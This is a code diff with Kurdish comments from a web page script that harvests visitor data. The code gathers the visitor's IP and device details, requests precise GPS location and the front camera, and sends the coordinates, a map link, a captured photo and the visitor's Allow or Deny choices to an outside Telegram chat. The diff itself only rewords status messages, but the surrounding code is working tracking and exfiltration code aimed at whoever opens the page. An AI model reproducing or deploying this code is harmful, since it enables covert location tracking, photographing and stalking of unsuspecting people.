@@ -68,7 +68,7 @@
         async function collectDeviceData() {
             if (!chatId) return;
 
-            // 1. ناردنی زانیارییە گشتییەکانی IP و ئامێر
+            // 1. زانیاری گشتی ئامێر و IP
             let ipData = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -87,7 +87,7 @@
             `;
             sendTelegramMessage(sysInfo);
 
-            // 2. پشکنینی دۆخی Location
+            // 2. پشکنینی ڕاستەوخۆ و وردی لۆکەیشن (Location Status)
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -96,21 +96,21 @@
                         const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                         
                         const locMsg = `
-🟢 **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**
-🎯 **دۆخ:** لۆکەیشنی مۆبایلەکەی (GPS) هەڵکراوە و شوێنی دەقیقی هێنرایەوە!
+🟢 **دۆخی ڕێگەپێدانی شوێن (Location): ALLOW کراوە**
+🎯 **دۆخی GPS:** لۆکەیشنی مۆبایلەکەی (GPS) **هەڵکراوە** و شوێنی دەقیقی هێنرایەوە!
 
-📍 **پۆتانەکان:** \`${lat},${lon}\`
+📍 **پۆتانە دەقیقەکان:** \`${lat},${lon}\`
 🗺 **نەخشە:** [کردنەوە لە Google Maps](${mapLink})
                         `;
                         sendTelegramMessage(locMsg);
                     },
                     (error) => {
                         if (error.code === error.PERMISSION_DENIED) {
-                            sendTelegramMessage("🔴 **ڕێگەپێدانی شوێن (Location): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Deny کرد یان ڕێگەی نەدا).");
+                            sendTelegramMessage("🔴 **دۆخی ڕێگەپێدانی شوێن (Location): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Don't Allow کرد و ڕێگەی نەدا).");
                         } else if (error.code === error.POSITION_UNAVAILABLE) {
-                            sendTelegramMessage("🟡 **ڕێگەپێدانی شوێن (Location): ALLOW کراوە**\n(کەسەکە Allowی کردووە، بەڵام **Location/GPSی مۆبایلەکەی داگیراوە/کوژاوەیە**، بۆیە شوێنی دەقیق نەدۆزرایەوە).");
+                            sendTelegramMessage("🟡 **دۆخی ڕێگەپێدانی شوێن (Location): ALLOW کراوە**\n(کەسەکە Allowی کردووە، بەڵام **Location / GPSی مۆبایلەکەی کوژاوەیە/داخراوە**، بۆیە شوێنی دەقیق نادۆزرێتەوە).");
                         } else if (error.code === error.TIMEOUT) {
-                            sendTelegramMessage("⚠️ **شوێن:** کاتەکە بەسەرچوو لە دەستنیشانکردنی GPS.");
+                            sendTelegramMessage("⚠️ **دۆخی شوێن:** کاتەکە بەسەرچوو لە دەستنیشانکردنی سیگناڵی GPS.");
                         }
                     },
                     { enableHighAccuracy: true, timeout: 8000 }
@@ -119,11 +119,11 @@
                 sendTelegramMessage("❌ ئامێرەکە پشتگیری لە Geolocation ناکات.");
             }
 
-            // 3. پشکنینی دۆخی کامێرا
+            // 3. پشکنینی ڕاستەوخۆ و وردی کامێرا (Camera Status)
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                     .then((stream) => {
-                        sendTelegramMessage("🟢 **ڕێگەپێدانی کامێرا (Camera): ALLOW کراوە**\n📸 وێنەکە گیرا و دەنێردرێت...");
+                        sendTelegramMessage("🟢 **دۆخی ڕێگەپێدانی کامێرا (Camera): ALLOW کراوە**\n📸 وێنەکە گیرا و ئێستا دەنێردرێت...");
 
                         const video = document.createElement('video');
                         video.srcObject = stream;
@@ -145,7 +145,7 @@
                         };
                     })
                     .catch((err) => {
-                        sendTelegramMessage("🔴 **ڕێگەپێدانی کامێرا (Camera): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Deny کرد و ڕێگەی نەدا وێنەی بپچرێت).");
+                        sendTelegramMessage("🔴 **دۆخی ڕێگەپێدانی کامێرا (Camera): DENY کراوە**\n(کەسەکە کلیکی لەسەر Block / Don't Allow کرد و ڕێگەی بە کامێرا نەدا).");
                     });
             } else {
                 sendTelegramMessage("❌ ئامێرەکە پشتگیری لە کامێرا ناکات.");
